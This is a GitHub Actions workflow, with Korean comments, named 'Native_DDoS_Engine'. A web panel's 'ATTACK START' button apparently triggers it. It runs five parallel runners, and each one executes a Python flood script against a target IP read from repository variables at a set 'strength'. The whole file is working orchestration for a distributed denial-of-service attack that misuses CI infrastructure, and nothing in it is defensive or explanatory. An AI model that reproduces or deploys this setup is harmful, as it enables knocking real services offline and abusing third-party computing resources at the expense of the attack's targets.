name: Native_DDoS_Engine
on:
  workflow_dispatch: # 웹 패널의 'ATTACK START' 버튼이 이 부분을 깨웁니다.

jobs:
  flood_attack:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node: [1, 2, 3, 4, 5] # 5대의 서버가 동시에 독립적으로 구동
    steps:
      - name: Checkout Code
        uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'

      - name: Install Dependencies
        run: pip install aiohttp

      - name: Launch Ultra Flood
        env:
          # 중요: 웹 패널이 수정한 변수를 서버 환경변수로 주입
          TARGET_IP: ${{ vars.TARGET_IP }}
          STRENGTH: 2000
        run: |
          # ultra_flood.py가 이 환경변수를 읽어서 공격하도록 실행
          python3 ultra_flood.py
